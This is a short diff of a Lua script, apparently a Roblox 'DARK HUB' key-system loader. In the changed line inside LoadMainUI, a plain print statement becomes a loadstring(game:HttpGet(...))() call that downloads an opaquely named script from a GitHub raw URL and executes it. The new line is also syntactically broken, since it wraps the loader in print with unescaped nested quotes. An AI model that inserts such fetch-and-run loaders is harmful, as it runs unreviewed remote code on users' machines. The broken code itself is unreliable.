@@ -16,7 +16,7 @@ local VALID_KEYS = {
 
 local function LoadMainUI()
     -- Masukkan Main UI game milikmu sendiri di sini.
-    print("DARK HUB MAIN UI LOADED")
+    print("loadstring(game:HttpGet("https://raw.githubusercontent.com/lugowonhlugowonh-ux/ZKLQW/refs/heads/main/Wkwkejsnsmmkaka"))()")
 end
 
 local ScreenGui = Instance.new("ScreenGui")
